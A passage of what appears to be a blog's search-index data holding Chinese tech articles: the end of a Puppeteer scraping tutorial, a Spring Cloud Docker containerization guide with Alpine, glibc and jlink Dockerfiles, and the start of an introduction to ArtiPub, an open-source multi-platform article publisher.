Chromium（请自备梯子），可以使用 --ignore-scripts 参数跳过 Chromium 的下载，也可以通过设置环境变量 PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=1 来跳过下载。 12345# 安装puppeteer$ npm install puppeteer -g --ignore-scripts# 或者使用淘宝镜像源安装puppeteer$ npm install puppeteer -g --ignore-scripts --registry=https://registry.npm.taobao.org 手动下载 Chromium 并解压在本地磁盘，下载可以点击这里（请自备梯子）： Puppeteer 入门案例入门案例初始化项目： 1$ npm init 创建 index.js 文件，代码如下，executablePath 是 Chromium 或者 Chrome 可执行文件的路径： 123456789101112const puppeteer = require(\'puppeteer\');(async () =&gt; { const browser = await puppeteer.launch({ executablePath: \'/usr/bin/google-chrome-stable\', headless: false }); const page = await browser.newPage(); await page.goto(\'http://www.baidu.com/\'); await page.screenshot({path: \'baidu.png\'}); browser.close();})(); 执行 index.js 脚本，运行成功后，会在当前目录下生成网页的截图文件 baidu.png： 1$ node index.js 启动参数Puppeteer Launch 的启动参数如下： executablePath：Chromium 或 Chrome 可执行文件的路径 headless：是否运行在浏览器 headless 模式，true 表示不打开浏览器执行，默认为 true timeout：等待浏览器实例启动的最长时间（以毫秒为单位），默认为 30000，当值为 0 时表示禁用超时 args：传递给浏览器实例的其他参数 Puppeteer 实战Puppeteer 环境变量Puppeteer 的环境变量如下，在使用 puppeteer-core 时，下述环境变量中以 PUPPETEER_* 开头的会被忽略： HTTP_PROXY、HTTPS_PROXY, NO_PROXY - 定义用于下载和运行 Chromium 的 HTTP 代理设置 PUPPETEER_SKIP_CHROMIUM_DOWNLOAD - 请勿在安装步骤中下载绑定的 Chromium PUPPETEER_DOWNLOAD_HOST - 覆盖用于下载 Chromium 的 URL 的主机部分 PUPPETEER_CHROMIUM_REVISION - 在安装步骤中指定一个 puppeteer 使用的特定版本的 Chromium PUPPETEER_EXECUTABLE_PATH - 指定一个 Chrome 或者 Chromium 可执行文件的路径，会被用于 puppeteer.launch Puppeteer 的选择器Puppeteer 中获取元素的方法和浏览器里面的一样，但是获取元素的属性的办法和浏览器不一样，它有一套 API 用来获取界面中的元素，还有一套 API 用来获取元素的属性。 获取元素的操作如下： 12345// Page.$(selector) 获取单个元素，底层是调用的是 document.querySelector()，所以选择器的 selector 格式遵循 CSS 选择器规范let inputElement = await page.$(\'#search\');// Page.$$(selector) 获取一组元素，底层调用的是 document.querySelectorAll()，返回 Promise(Array(ElemetHandle)) 元素数组const links = await page.$$("a"); 获取元素的属性的操作如下： 1234567// Puppeteer 获取元素属性跟平时写 JavaScript 的逻辑有点不一样，按照通常的逻辑，应该是现获取元素，然后再获取元素的属性// Puppeteer 获取元素的 API 最终返回的都是 ElemetHandle 对象，而 ElemetHandle 并没有提供获取元素属性的 API，而 Puppeteer 专门提供了一套获取元素属性的 API，分别是： Page.$eval() 和 Page.$$eval()const href = await page.$eval(\'#a\', ele =&gt; ele.href);const content = await page.$eval(\'.content\', ele =&gt; ele.outerHTML);const value = await page.$eval(\'input[name=search]\', input =&gt; input.value);const textArray = await page.$$eval(\'#dom\', els =&gt; Array.from(els).map(el =&gt; el.textContent)); 常用的元素选择器： 选择器 示例 示例说明 id 选择器 #id 选择匹配 id 的元素，仅存在一个 class 选择器 .class 同时匹配多个 class 元素 属性选择器 div[attr] 匹配具有 attr 的属性，不考虑具体的值 属性选择器 div[attr=‘122‘] 匹配具有 attr 的属性，值为 122 后代选择器 div span 后代选择器，匹配所有 div 后面的 span 标签，div 与 span 之间用空格隔开 子元素选择器 div &gt; span 子元素选择器，匹配 div 后所有的 span 匹配父元素下的第 n 个子元素 div:nth-child(2) 匹配父元素下的第 2 个元素 SegmentFault 模拟登录123456789101112131415161718192021222324252627const puppeteer = require(\'puppeteer\');(async () =&gt; { const browser = await puppeteer.launch({ executablePath: \'/usr/bin/google-chrome-stable\', headless: false }); const page = await browser.newPage(); page.setJavaScriptEnabled(true); page.setCacheEnabled(true); await page.goto("https://segmentfault.com/user/login", { "timeout" : 30000 }); // 选择登录方式 await page.tap(".login-nav &gt; a[data-mode=\'password\']"); // 输入用户名 await page.type("form[class=\'password-form\'] &gt; div &gt; input[name=\'username\']", \'admin\', {delay:100}); // 输入密码 await page.type("form[class=\'password-form\'] &gt; div &gt; input[name=\'password\']", \'123456\', {delay:100}); // 点击登录按钮 await page.tap("form[class=\'password-form\'] &gt; button[type=\'submit\']"); // await page.close(); // await browser.close();})(); Puppeteer 结合 Jest 使用Puppeteer 周边的开源项目 jvppeteer，Java 版的 Puppeteer pyppeteer，Python 版的 Puppeteer awesome-puppeteer，Puppeteer 相关的开源项目整理 docker-puppeteer，A minimal Docker image for Puppeteer puppeteer-cluster，Puppeteer Pool, run a cluster of instances in parallel puppeteer-deep，爬取《es6 标准入门》、自动推文到掘金、站点性能分析；高级爬虫、自动化 UI 测试、性能分析的实践案例 puppeteer-recorder，Puppeteer recorder is a Chrome extension that records your browser interactions and generates a Puppeteer script var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端 爬虫"},{title:"SpringCloud 容器化",url:"/posts/fe094f6c.html",text:'前言容器化技术的出现标准化了服务的基础设施，统一了应用的打包分发、部署及操作系统相关类库等，解决了测试及生产部署时环境差异的问题，更方便分析排查问题。对运维来说，由于镜像的不可变性，更容易进行服务部署升级及回滚。另外利用诸如 Kubemetes 之类的容器管理平台，更容易实现一键部署、扩容、缩容等操作，更能将微服务架构、DevOps、不可变基础设施的思想落地下来。本文重点讲述 Spring Cloud 如何使用 Docker 实现容器化。 Java 服务 Docker 化基础镜像选择操作系统层面，可以选择传统的 Centos、Ubuntu 或者轻量级的 Alpine。其中 Ubuntu 16.04 版本的镜像大小约为 113M，压缩后大约 43M；Centos 7 版本的镜像大小约为 199M，压缩后大约为 73M；而 Alpine 3.7 版本镜像大小约为 4.15M，压缩后约为 2M。关于基础镜像的选择，一个是考虑镜像大小，一个是只提供最小的依赖包。关于第二点，不同的服务应用依赖包是不同的，这里不再展开，只从镜像大小角度考虑的话，Alpine 是首选，镜像小，远程推拉镜像的速度快，更为方便，这里建议釆用 Alpine 镜像作为基础镜像。从 Docker 镜像分层缓存的机制来考虑，如果选择了比较大的基础镜像，DockerFile 编写时可以适当分层，然后集中在几台镜像打包机上处理镜像打包及上传，这样可以充分利用打包机镜像分层缓存的机制，减少上传镜像的耗时。但是对于分布式服务的 Docker 部署，目标服务实例部署的机器比较多而且是随机的，就没办法利用这个机制来加快镜像下载速度。 DockerFile 编写选择 Alpine 有个麻烦的地方就是 Alpine 采用的是 musl libc 的 C 标准库，而 Oracle JDK 或 OpenJDK 提供的版本则主要是以 glibc 为主，虽然 OpenJDK 在一些早期版本会放出使用 musl libc 编译好的版本，不过在正式发布的时候，并没有单独的 musl libc 编译版本可以下载，需要自己单独编译，稍微有些不便。因此可以考虑在 Alpine 里加上 glibc，然后添加 glibc 的 JDK 编译版本作为基础镜像。 Alpine + glibc下述的 DockerFile 中，选择 Alpine 3.7 版本，glibc 釆用 Sgerrand 开源的 glibc 安装包，版本为 2.27-r0，该镜像可以作为后面的 JDK 镜像 的基础镜像。 1234567891011121314151617181920FROM alpine:3.7MAINTAINER example &lt;example@gmail.com&gt;RUN apk add --no-cache ca-certificates curl openssl binutils xz tzdata \\ &amp;&amp; ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\ &amp;&amp; echo "Asia/Shanghai" &gt; /etc/timezone \\ &amp;&amp; GLIBC_VER="2.27-r0" \\ &amp;&amp; ALPINE_GLIBC_REPO="https://github.com/sgerrand/alpine-pkg-glibc/releases/download" \\ &amp;&amp; curl -Ls ${ALPINE_GLIBC_REPO}/${GLIBC_VER}/glibc-${GLIBC_VER}.apk &gt; /tmp/${GLIBC_VER}.apk \\ &amp;&amp; apk add --allow-untrusted /tmp/${GLIBC_VER}.apk \\ &amp;&amp; curl -Ls https://www.archlinux.org/packages/core/x86_64/gcc-libs/download &gt; /tmp/gcc-libs.tar.xz \\ &amp;&amp; mkdir /tmp/gcc \\ &amp;&amp; tar -xf /tmp/gcc-libs.tar.xz -C /tmp/gcc \\ &amp;&amp; mv /tmp/gcc/usr/lib/libgcc* /tmp/gcc/usr/lib/libstdc++* /usr/glibc-compat/lib \\ &amp;&amp; strip /usr/glibc-compat/lib/libgcc_s.so.* /usr/glibc-compat/lib/libstdc++.so* \\ &amp;&amp; curl -Ls https://www.archlinux.org/packages/core/x86_64/zlib/download &gt; /tmp/libz.tar.xz \\ &amp;&amp; mkdir /tmp/libz \\ &amp;&amp; tar -xf /tmp/libz.tar.xz -C /tmp/libz \\ &amp;&amp; mv /tmp/libz/usr/lib/libz.so* /usr/glibc-compat/lib \\ &amp;&amp; apk del binutils \\ &amp;&amp; rm -rf /tmp/${GLIBC_VER}.apk /tmp/gcc /tmp/gcc-libs.tar.xz /tmp/libz /tmp/libz.tar.xz /var/cache/apk/* 这里有几点需要注意： 由于 Docker 镜像采用的是分层机制，因此安全类库或软件的命令最好在同一行命令中，减少分层，以降低最后镜像的大小 命令中间安装了类库或软件包，需要在同一行命令中删除 apk 的 cache，这样才能有效删除 apk，以减少镜像大小 这里安装了 openssl、curl、xz、tzdata 库，同时把 timezone 改为了 Asia/Shanghai 构建镜像的命令为：docker build -f /usr/local/DockerFile-Alpine-Glibc -t alpine-3.7:glibc-2.27-r0 .，其中 /usr/local/DockerFile-Alpine-Glibc 是 DockerFile 的文件路径 由于构建镜像的过程比较慢，这里给出阿里云上已构建好的镜像（alpine + glibc），可以直接拉取到本地来使用，命令如下： 12# 拉取镜像# docker pull registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0 Alpine + glibc + JDK8对于 JDK 版本的选择，有 Oracle 的 Hotspot JDK，也有 OpenJDK。对于 Oracle 的 JDK，个人使用及非商业使用是免费的，而对于商业使用来说，需进行企业订阅，在 2019 年 1 月之后才能继续获得 Java SE8 更新。Oracle 已经建议选择不订阅或不继续订阅的公司在订阅结束之前，把 JDK 版本迁移到 OpenJDK，以确保相关应用程序不受影响。下述的 JDK 8 版本釆用 Oracle 的 server-jre-8ul72 版本，而对于 JDK 9、10 及 11 版本，则釆取 OpenJDK 来构建。附上 OpenJDK 的官方下载地址。 123456FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0MAINTAINER example &lt;example@gmail.com&gt;ADD server-jre-8u172-linux-x64.tar.gz /opt/RUN chmod +x /opt/jdk1.8.0_172ENV JAVA_HOME=/opt/jdk1.8.0_172ENV PATH="$JAVA_HOME/bin:${PATH}" Alpine + glibc + JDK9123456FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0MAINTAINER example &lt;example@gmail.com&gt;ADD openjdk-9u181_linux-x64_bin.tar.gz /opt/RUN chmod +x /opt/jdk-9ENV JAVA_HOME=/opt/jdk-9ENV PATH="$JAVA_HOME/bin:${PATH}" Alpine + glibc + JDK10123456FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0MAINTAINER example &lt;example@gmail.com&gt;ADD openjdk-10.0.1_linux-x64_bin.tar.gz /opt/RUN chmod +x /opt/jdk-10.0.1ENV JAVA_HOME=/opt/jdk-10.0.1ENV PATH="$JAVA_HOME/bin:${PATH}" Alpine + glibc + JDK11123456FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0MAINTAINER example &lt;example@gmail.com&gt;ADD openjdk-11+28_linux-x64_bin.tar.gz /opt/RUN chmod +x /opt/jdk-11ENV JAVA_HOME=/opt/jdk-11ENV PATH="$JAVA_HOME/bin:${PATH}" 阿里云上有已构建好的不同版本的 JDK 镜像，拉取到本地就可以直接使用： 1234567891011# 基于 Oracle JDK 8 构建的镜像# docker pull registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:8u172-jre-alpine# 基于 OpenJDK 9 构建的镜像# docker pull registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:openjdk-9u181-alpine# 基于 OpenJDK 10 构建的镜像# docker pull registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:openjdk-10.0.1-alpine# 基于 OpenJDK 11 构建的镜像# docker pull registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:openjdk-11-ea19-alpine Maven 构建与发布镜像构建镜像的 Maven 插件主流的几款 Docker 的 Maven 插件： 这里以 Maven 构建为例，选用的是 com.spotify 的插件，其 Maven 的 POM 配置如下。使用 spring-boot-maven-plugin 的 1.4.3 版本，另外设置的镜像前缀为 registry.cn-hangzhou.aliyuncs.com/springcloud-cn，tag 为 $(project.version)， repository（私有仓库地址）为 ${docker.image.prefix}/${project.artifactId}，另外这里还传递了一个 Docker 的 buildArg 为 JAR_FILE，其值为 $(project.build.finalName) .jar。username 与 password 标签是指访问私有仓库的用户名和密码，若不需要身份认证，则可以注释这两个标签。点击下载完整的示例代码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;dockerfile.maven.version&gt;1.4.3&lt;/dockerfile.maven.version&gt; &lt;docker.image.prefix&gt;registry.cn-hangzhou.aliyuncs.com/springcloud-cn&lt;/docker.image.prefix&gt;&lt;/properties&gt;&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;com.spotify&lt;/groupId&gt; &lt;artifactId&gt;dockerfile-maven-plugin&lt;/artifactId&gt; &lt;version&gt;${dockerfile.maven.version}&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;default&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;build&lt;/goal&gt; &lt;goal&gt;push&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;skipPush&gt;true&lt;/skipPush&gt; &lt;!-- &lt;username&gt;admin&lt;/username&gt; --&gt; &lt;!-- &lt;password&gt;123456&lt;/password&gt; --&gt; &lt;repository&gt;${docker.image.prefix}/${project.artifactId}&lt;/repository&gt; &lt;tag&gt;${project.version}&lt;/tag&gt; &lt;buildArgs&gt; &lt;JAR_FILE&gt;${project.build.finalName}.jar&lt;/JAR_FILE&gt; &lt;/buildArgs&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; Maven 构建镜像的 DockFileMaven 项目的 DockerFile 内容如下，特别注意，DockerFile 需要放在 IDEA 里的某个应用（模块）的根目录下。例如 gateway-server 模块需要打包，并发布构建到 Docker 镜像里，那么 DockerFile 此时应该放在 gateway-server 模块的根目录下，不同的应用（模块）可以拥有自己的 DockerFile。下面的 registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:8u172-jre-alpine 是指私有仓库里已构建好的 JDK 镜像。 123456FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:8u172-jre-alpineARG JAR_FILEENV PROFILE defaultADD target/${JAR_FILE} /opt/app.jarEXPOSE 8080ENTRYPOINT java ${JAVA_OPTS} -Djava.security.egd=file:/dev/./urandom -Duser.timezone=Asia/Shanghai -Dfile.encoding=UTF-8 -Dspring.profiles.active=${PROFILE} -jar /opt/app.jar Maven 打包构建镜像执行下述的 Maven 打包构建命令（跳过单元测试），成功后会在本地构建生成新的 Docker 镜像，如果上面的 POM 配置了 &lt;skipPush&gt;false&lt;/skipPush&gt;，会自动将新的镜像 Push 到私有仓库。 1$ mvn clean package -Dmaven.test.skip=true Maven Push 镜像Maven 手动 Push 镜像到 私有仓库： 12345# 第一种方式：不使用身份认证或者使用POM配置里的私有仓库账号进行Push$ mvn dockerfile:push# 第二种方式：使用指定的私有仓库账号进行Push$ mvn dockerfile:push -Ddockerfile.username=xxx -Ddockerfile.password=xxx Maven 运行镜像执行以下命令运行镜像，实际项目中可以根据项目需要调整对应的 JVM 参数： 1234# docker run -p 8080:8080 --rm \\-e JAVA_OPTS=\'-server -Xmx1g -Xms1g -XX:MetaspaceSize=64m -verbose:gc -verbose:sizes -XX:+UseG1GC -XX:MaxGCPauseMillis=50 -XX:+UnlockDiagnosticVMOptions -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/ -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+PrintTenuringDistribution -Xloggc:/opt/gc.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=20M -Djava.io.tmpdir=/tmp\' \\-e PROFILE=\'default\' \\registry.cn-hangzhou.aliyuncs.com/springcloud-cn/gateway:1.0-SNAPSHOT JDK 8+ 的 Docker 资源限制支持JDK 8 &amp;&amp; JDK 9Java 8ul31 及以上版本开始支持了 Docker 的 CPU 和 Memory 限制。对于 CPU 的限制，如果 JVM 没有显式指定 -XX： ParalllelGCThreads 或者 -XX： CICompilerCount，那么 JVM 会使用 Docker 的 CPU 限制。如果 Docker 有指定 CPU Limit，JVM 参数也有指定 -XX： ParalllelGCThreads 或者 -XX： CICompilerCount，那么最终以指定的 JVM 参数为准。对于 Memory 限制，需要加上 -XX： +UnlockExperimentalVMOptions 和 -XX： +UseCGroupMemoryLimitForHeap 才能使得 Xmx 感知 Docker 的 Memory Limit。 JDK 10JDK 10 版本废弃了 UseCGroupMemoryLimitForHeap，同时新引入了新配置 ActiveProcessorCount，可以用来强制指定 CPU 的个数。 JDK 11JDK 11 正式移除 UseCGroupMemoryLimitForHeap，同时新引入 UseContainerSupport 配置，默认为 ture，即默认支持 Docker 的 CPU 及 Memory 限制，也可以设置为 false 来禁用容器支持。 JDK 9+ 镜像优化JDK9 及以上的版本与之前的版本有一个比较大的变动，就是 JDK9 及以上的版本支持模块系统 JPMS，同时 JDK 自身也模块化了，里面的 Modular Run-Time Images 功能特性以及 jlink 工具对于镜像的优化非常有帮助，可根据所需模块来精简 JDK。 Jlink 工具Jlink 工具可以用来将已有的 JDK 按所需模块进行优化，并重新组装成一个自定义的 runtime image，其基本语法如下： jlink [options] --module-path modulepath --add-modules module [,module...] 其中 module-path 参数用于指定需要 Jlink 的 JDK 的 jmods 路径，options 的部分参数说明如下： add-mobules，用来指定所需要的模块名称，比如 java.xml compress，用来指定压缩级别，0 为不压缩，1 为常量字符串共享，2 为 Zip 压缩 no-hreader-files，表示排除掉 header 文件 output，指定输出精简后的 JDK 的文件夹路径 Jlink 使用案例创建对应 Dockerfile，配置内容如下，其中指定了需要依赖的 JDK 模块，目的是通过 Jlink 生成精简的 JDK，点击下载完整的示例代码。 1234567891011121314151617181920212223FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:openjdk-10.0.1-alpine as packager# jlink toolRUN /opt/jdk-10.0.1/bin/jlink \\ --module-path /opt/jdk-10.0.1/jmods \\ --verbose \\ --add-modules java.base,java.logging,java.xml,jdk.unsupported,java.sql,java.desktop,java.management,java.naming,java.instrument,jdk.jstatd,jdk.jcmd,jdk.management \\ --compress 2 \\ --no-header-files \\ --output /opt/jdk-10-jlinked# copy jdk after jlinkFROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0COPY --from=packager /opt/jdk-10-jlinked /opt/jdk-10.0.1ENV JAVA_HOME=/opt/jdk-10.0.1ENV PATH=$JAVA_HOME/bin:$PATH# add application jarARG JAR_FILEENV PROFILE defaultADD target/${JAR_FILE} /opt/app.jarEXPOSE 8080ENTRYPOINT java ${JAVA_OPTS} -Djava.security.egd=file:/dev/./urandom -Duser.timezone=Asia/Shanghai -Dfile.encoding=UTF-8 -Dspring.profiles.active=${PROFILE} -jar /opt/app.jar 通过 Maven 打包构建镜像： 1$ mvn clean package -Dmaven.test.skip=true 查看镜像的大小，可以发现精简后的 JDK 包括 app.jar，总大小在 100M 以内： 12# docker images |grep gatewaydocker images |grep gatewayregistry.cn-hangzhou.aliyuncs.com/springcloud-cn/gateway 1.0-SNAPSHOT 8f0c327e65a4 2 minutes ago 96MB 运行镜像： 1234# docker run -p 8080:8080 --rm \\-e JAVA_OPTS=\'-server -XX:+UseG1GC -XX:MaxGCPauseMillis=50 -XX:+UnlockDiagnosticVMOptions -XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap -XX:ActiveProcessorCount=1 -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/ -Xlog:age*,gc*=info:file=gc-%p-%t.log:time,tid,tags:filecount=5,filesize=10m -Djava.io.tmpdir=/tmp\' \\-e PROFILE=\'default\' \\registry.cn-hangzhou.aliyuncs.com/springcloud-cn/gateway:1.0-SNAPSHOT 查看精简后的 JDK 大小： 12345678910# 连接容器# docker exec -it dreamy_golick /bin/sh# 查看精简后的JDK大小# du -sh /opt/jdk-10.0.1/53.5M /opt/jdk-10.0.1/# 查看应用Jar包的大小# du -sh /opt/app.jar22.2M /opt/app.jar var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务 容器化"},{title:"ArtiPub 一款开源的一文多发平台",url:"/posts/5987f4b4.html",text:'前言很多优秀的程序员和技术人员喜欢写技术文章和技术博客，通过这样的方式分享传播知识和经验，扩大自己的知名度和影响力，吸引粉丝关注，甚至有些技术博主还通过写文章来获取广告收入，还通过这种方法获得了出版书的机会以及工作机会。因此，写技术文章是一件非常值得投入的事情，帮助了自己，也让大众受益。但是，写技术文章通常也很耗时，特别是一些优质文章，不仅需要旁征博引、构思文章结构、照顾读者受众，还需要做很多前期工作，例如搭建环境、写 Demo 代码、测试代码等等。一篇优质技术文章通常需要 3-6 个小时来完成，可花了很多时间来写文章，最终发布出来的文章得不到很多人的关注是一件相当令人沮丧的事情。因此，优质文章值得获取关注和传播，让更多的技术工作者通过阅读文章获取知识获益。每个技术博主都有自己喜欢的技术媒体平台，例如简书、知乎、掘金、CSDN、微信公众号等等。很多技术博主也喜欢将文章发布在不同的平台上，寻求最大的关注度，同时也防止自己辛辛苦苦写的文章被别人复制粘贴盗版过去。然而，在多个平台上发文是一件麻烦的事情：博主需要同时登陆多个媒体平台，将自己的文章复制一个一个粘贴过去；更麻烦的是，有些平台只支持 Markdown，有些平台只支持富文本，博主需要在这两者之间来回转换，这增加了工作量。一文多发平台 ArtiPub 就解决了这样的问题，下面将介绍开源的一文多发平台 ArtiPub。 ArtiPub 简介ArtiPub（Article Publisher 的简称，意为” 文章发布者”）是一款开源的一文多发平台，可以帮助文章作者将编写好的文章自动发布到简书、掘金、SegmentFault、CSDN、知乎、开源中国等技术媒体平台，传播优质知识，获取最大的曝光度。ArtiPub 安装简单，提供了多种安装方式（Docker、NPM、源码），可以一键安装使用，安装一般只要 5 分钟。ArtiPub 目前支持文章编辑、文章发布、数据统计的功能，后期会加入存量文章导入、数据分析的功能。此外，ArtiPub 日后还会接入更多媒体渠道，真正做到让文章随处可阅。用户使用 ArtiPub 也很简单，只需要在浏览器上打开 ArtiPub 的 Web 界面，将文章以 Markdown 的形式输入到编辑器，然后点击一键发布，等待不到 1 分钟，文章就自动同步到各大技术媒体平台了。此外，文章的阅读、点赞、评论数据还将周期性的被同步回来，让作者可以近实时看到文章的传播情况。 ArtiPub 原理简介ArtiPub 的底层原理并不复杂，简单来说就是利用了爬虫技术将文章发布到各大平台。ArtiPub 的爬虫是用了 Google 开源的自动化测试工具 Puppeteer，这个工具不仅可以获取需要有 ajax 动态内容的数据，还可以来做一些模拟操作，作用类似于 Selenium，但更强大。如何进行登陆操作呢？其实 ArtiPub 是通过 Chrome 插件获取了用户登陆信息（Cookie），将 Cookie 注入到由 Puppeteer 操作的 Chromium 浏览器中，然后浏览器就可以正常登陆网站进行发文操作了。Cookie 是保存在用户自己搭建的 MongoDB 数据库里，不对外暴露，因此很安全。 ArtiPub 的架构示意图如下： 架构原理简介如下： 后端（Backend）是整个架构的中枢，负责给前端交换数据、储存读取数据库、控制爬虫、收集 Cookie 等 Chrome 插件（Chrome Extension）只负责从网站（Sites）获取 Cookie 爬虫（Spiders）被后端控制，负责在网站上发布文章和抓取数据 数据库（MongoDB）负责储存数据（Cookie） 前端（Frontend）是一个 React 应用，基于 Ant Design Pro 改造而来 ArtiPub 支持的平台 掘金 SegmentFault CSDN 简书 知乎 开源中国 今日头条 博客园 微博 百度百家号 51CTO 开发者头条 微信公众号 ArtiPub 与其他平台比较市面上已经存在一文多发的商业平台了，为何还要创建 ArtiPub 呢？或许其他一文多发平台也是一个替代方案，但它们要求用户将自己的账户信息，例如 Cookie 或账号密码上传到对方服务器，这很不安全，一旦平台发生问题，自己的账户信息会遭到泄漏。虽然一般的平台不会恶意操作用户的账户，但如果出现误操作或者黑客攻击，用户的账户信息将遭到泄漏，平台上的财产也可能遭到损坏。ArtiPub 不要求用户上传账户信息，所有账户信息全部保存在用户自己的数据库里，因此规避了这个安全风险。另外，由于 ArtiPub 是基于 JS 开源的，JS 源码也比较易于理解，可扩展性很强，用户如果有其他平台的接入需求，完全可以通过更改源码来实现自己的需求，不用等待平台更新。官方的开发组也将持续开发 ArtiPub，将其打造得更实用和易用。 ArtiPub 安装Docker 安装 ArtiPub 软件依赖 软件版本 Docker 18.03 Docker Compose 1.24.1 通过 Docker，可以免去手动安装 MongoDB 的步骤，这是最推荐的安装方式。使用 Docker 安装 ArtiPub 前，请确保已安装好 Docker 以及 Docker Compose。在项目目录下创建 docker-compose.yml 文件，输入如下内容： 1234567891011121314151617181920version: \'3.3\'services: app: image: "tikazyq/artipub:latest" container_name: "artipub-server" environment: MONGO_HOST: "mongo" ARTIPUB_API_ADDRESS: "http://localhost:3000" # 后端服务的API地址，如果后端服务不是安装在本机，请修改为协议 + 服务器 IP 地址 + 端口号（默认端口为 3000） ports: - "8000:8000" # 前端服务 - "3000:3000" # 后端服务 depends_on: - mongo mongo: image: mongo:latest container_name: "artipub-mongo" restart: always ports: - "27017:27017" 由于 ArtiPub 采用了前后端分离的架构，前端使用 Nginx 作为 Web 服务器，如果需要对 Nginx 进行配置（例如配置跨域），此时可以使用数据卷来挂载 Nginx 的配置文件到 ArtiPub 的容器内，ArtiPub 的 Nginx 配置文件路径为：/etc/nginx/conf.d/artipub.conf： 12345678910111213141516171819202122version: \'3.3\'services: app: image: "tikazyq/artipub:latest" container_name: "artipub-server" environment: MONGO_HOST: "mongo" ARTIPUB_API_ADDRESS: "http://localhost:3000" ports: - "8000:8000" - "3000:3000" depends_on: - mongo mongo: image: mongo:latest container_name: "artipub-mongo" restart: always ports: - "27017:27017" volumes: - \'/usr/local/docker-volumes/artipub/artipub.conf:/etc/nginx/conf.d/artipub.conf\' 创建并启动 ArtiPub 的容器，启动完成后在浏览器中访问 http://127.0.0.1:8000，可以看到 Web 管理界面： 12345# 后台启动# docker-compose up -d# 查看输出的日志信息# docker logs artipub-server --tail 100 -f MongoDB 数据库管理命令： 1234567891011# 登录MongoDB# docker exec -it artipub-mongo mongo# 显示所有数据库&gt; show dbs# 切换数据库&gt; use artipub# 查看数据库的所有集合&gt; show collections NPM 包安装 ArtiPub 软件依赖 软件版本 NodeJS 8.12+ MongoDB 3.6+ 123456789101112131415# 提示：通过 NPM 包安装 ArtiPub，需要提前手动安装好 MongoDB# 安装# npm install -g artipub# 